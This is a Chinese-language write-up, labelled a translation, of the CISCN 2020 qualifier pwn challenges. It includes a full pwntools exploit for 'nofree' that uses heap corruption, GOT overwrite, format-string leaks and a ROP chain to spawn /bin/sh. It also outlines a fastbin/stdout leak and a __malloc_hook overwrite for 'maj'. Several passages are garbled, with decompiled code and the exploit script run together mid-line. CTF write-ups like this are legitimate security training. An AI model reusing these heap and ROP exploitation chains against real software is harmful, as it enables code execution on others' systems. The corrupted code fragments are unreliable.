# CISCN 2020 初赛Pwn
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
pwn题全都没给libc，不过好在nofree那道题搞出来之后直接查出来libc的版本，后面就轻松很多了。wow这道题搞了很久，主要代码太长看得有点心累，再看解出题的队伍蛮多的就死磕了。
## 题解
###  babyjsc
这题我附件都没搞下来就被秒得稀烂了，最后队友说就是个python2会eval输入的内容（最后附件我也没搞下来，速度太慢了），反正是个水题。
###  nofree
  1. 只有两个功能，一个`new`（这个`malloc`是我自己命名的，只是为了方便看，实际上是通过`strdup`里的`malloc`进行分配的）： 
         int new()
     {
       int result; // eax
       int v1; // [rsp+8h] [rbp-8h]
       int v2; // [rsp+Ch] [rbp-4h]
       result = get_idx();
       v1 = result;
       if ( result != -1 )
       {
         printf("size: ");
         result = choice();
         v2 = result;
         if ( result >= 0 && result > ", "1")
         p.sendlineafter("idx: ", str(idx))
         p.sendlineafter("size: ", str(size))
         p.sendafter("content: ", content)
     def add_s(idx, size, content):
         p.sendafter("choice>> ", "1\x00")
         if idx == 0:
             p.sendafter("idx: ", "\x00")
         else:
             p.sendafter("idx: ", "1" * idx + '\x00')
         p.sendlineafter("size: ", "%" + str(size) + "c")
         p.sendafter("content: ", content)
     def edit(idx, content):
         p.sendlineafter("choice>> ", "2")
         p.sendlineafter("idx: ", str(idx))
         p.sendafter("content: ", content)
     def edit_s(idx, content):
         p.sendafter("choice>> ", "11\x00")
         if idx == 0:
             p.sendafter("idx: ", "\x00")
         else:
             p.sendafter("idx: ", "1" * idx + "\x00")
         p.sendafter("content: ", content)
     atoi_got = elf.got['atoi']
     exit_got = elf.got['exit']
     read_got = elf.got['read']
     printf_got = elf.got['printf']
     printf_plt = elf.plt['printf']
     ret = 0x00000000004006b9 # ret
     # hijack chunk array
     add(0, 0x80, "AAA\x00")
     edit(0, "A" * 0x18 + p64(0xfe1))
     for i in range(24):
         add(0, 0x90, "B" * 0x90)
     add(0, 0x90, "A" * 0x30)
     add(1, 0x90, "A" * 0x88 + p64(0x81))
     edit(0, "A" * 0x38 + p64(0x81) + p64(0x6020C0 + 0x100))
     add(0, 0x81, "A" * 0x77)
     add(0, 0x81, "A" * 0x77)
     # write atoi_got table
     edit(0, p64(atoi_got) + p64(0x100))
     edit(1, p64(printf_plt))
     edit_s(0, p64(exit_got) + p64(0x100))
     edit_s(1, p64(ret))
     # leak read to get syscall gadget
     payload = "%7$s%8$s" + p64(read_got) + p64(printf_got)
     p.sendlineafter("choice>> ", payload)
     libc_read = u64(p.recv(6).ljust(8, "\x00"))
     syscall = libc_read + 0xE
     libc_printf = u64(p.recv(6).ljust(8, "\x00"))
     # leak stack
     payload = "%12$p"
     p.sendlineafter("choice>> ", payload)
     p.recvuntil("0x")
     stack_addr = int(p.recv(12), 16)
     # write gadget
     pop_rdi = 0x0000000000400c23 # pop rdi ; ret
     pop_rsi = 0x0000000000400c21 # pop rsi ; pop r15 ; ret
     gadget_1 = 0x400C00
     gadget_2 = 0x400C16
     edit_s(0, p64(stack_addr + 8) + p64(0x300) + "/bin/sh\x00" + p64(syscall))
     payload = flat([pop_rdi, 0, pop_rsi, stack_addr + 0xB8, 0, libc_read]) # control rax
     payload += flat([gadget_2, 0, 0, 1, 0x6020C0  + 0x128, 0, 0, 0x6020C0 + 0x120])
     payload += flat([gadget_1, 0, 0, 0, 0, 0, 0, 0])
     # raw_input()
     edit_s(1, payload)
     sleep(2)
     p.send('A' * 0x3b)
     '''
     .text:0000000000400C00 loc_400C00: 
     .text:0000000000400C00                 mov     rdx, r13
     .text:0000000000400C03                 mov     rsi, r14
     .text:0000000000400C06                 mov     edi, r15d
     .text:0000000000400C09                 call    qword ptr [r12+rbx*8]
     .text:0000000000400C0D                 add     rbx, 1
     .text:0000000000400C11                 cmp     rbx, rbp
     .text:0000000000400C14                 jnz     short loc_400C00
     .text:0000000000400C16
     .text:0000000000400C16 loc_400C16:                             ; CODE XREF: init+34↑j
     .text:0000000000400C16                 add     rsp, 8
     .text:0000000000400C1A                 pop     rbx
     .text:0000000000400C1B                 pop     rbp
     .text:0000000000400C1C                 pop     r12
     .text:0000000000400C1E                 pop     r13
     .text:0000000000400C20                 pop     r14
     .text:0000000000400C22                 pop     r15
     .text:0000000000400C24                 retn
     '''
     success("libc_read: " + hex(libc_read))
     success("libc_printf: " + hex(libc_printf))
     success("stack_addr: " + hex(stack_addr))
     p.interactive()
###  maj
  1. 比较常规的利用方法，给了四个功能实际上只有三个有效，分别是： 
    * `add`功能： 
                  v10 = __readfsqword(0x28u);
          puts("please answer the question\n");
          _isoc99_scanf("%d", &v8);
          if ( !sub_400B2B(v8) )
          exit(0);
          puts("you are right\n");
          for ( i = 0; i = 0 && v7 = 0 && v3 = 0 && v3  dword_603040 || dword_603040 fd = main_arena + 0x58`。
  3. 由于没有`show`，通用的办法就是通过上述构造，对`fastbin->fd`进行partial write 2 byte，所以只要bruteforce 4 bits，就能通过fastbin attack分配到`stdout`结构体的上方，然后将: 
         _flags = 0xfbad1800
     _IO_read_ptr = 0
     _IO_read_end = 0
     _IO_read_base = 0
     _IO_write_base = 0xXXXXXXXXXXXXXX00
就能leak出缓冲区的内存，从而leak出libc地址。
  4. 由于通过nofree那题拿到了libc版本，所以后面就是利用uaf打`__malloc_hook`为`onegadget`即可。
  5. exp仅供参考： 